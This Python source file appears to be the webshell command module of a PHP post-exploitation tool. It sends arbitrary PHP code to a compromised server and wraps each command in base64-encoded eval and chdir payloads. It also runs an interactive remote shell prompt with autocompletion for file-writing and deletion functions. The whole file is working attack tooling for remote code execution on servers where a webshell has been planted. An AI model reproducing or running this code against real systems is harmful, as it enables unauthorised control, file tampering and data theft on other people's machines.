from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode
from libs.app import readline, value_translation

NEW_WORDLIST = {"common_wordlist": (
    "trim",
    "dirname",
    "strtolower",
    "strtoupper",
    "strcmp",
    "str_replace",
    "strstr",
    "md5",
    "array",
    "fopen",
    "is_readable",
    "is_writable",
    "is_executable",
    "fwrite",
    "file_put_contents",
    "file_get_contents",
    "fputs",
    "file",
    "basename",
    "scandir",
    "echo",
    "print_r",
    "var_dump",
    "mkdir",
    "rmdir",
    "unlink",
    "copy",
    "rename",
    "chdir",
)}


@alias(True, func_alias="ws", _type="SHELL")
def run(*commands):
    """
    webshell

    Get a webshell of target system or just run a webshell command.
    """
    command = str(value_translation(gget("raw_command_args")))
    if (command):
        res = send((command))
        if (not res):
            return
        print(color.green("\nResult:\n\n") + res.r_text.strip() + "\n")
        return
    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
    pwd = send(f'print(getcwd());').r_text.strip()
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    readline.set_wordlist(NEW_WORDLIST)
    try:
        while gget("loop"):
            print(f"webshell:{pwd} >> ", end="")
            command = str(value_translation(readline(b"(")))
            lower_command = command.lower()
            if (lower_command.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (command == ''):
                print()
                continue
            command = base64_encode(command)
            b64_pwd = base64_encode(pwd)
            if (lower_command.startswith("cd ") and len(lower_command) > 3):
                path = base64_encode(lower_command[3:].strip())
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                if (not res):
                    return
                pwd = res.r_text.strip()
            else:
                res = send(f'eval("chdir(base64_decode(\'{b64_pwd}\'));eval(base64_decode(\'{command}\'));");')
                if (not res):
                    return
                print("\n" + res.r_text.strip() + "\n")
    finally:
        readline.set_wordlist(wordlist)
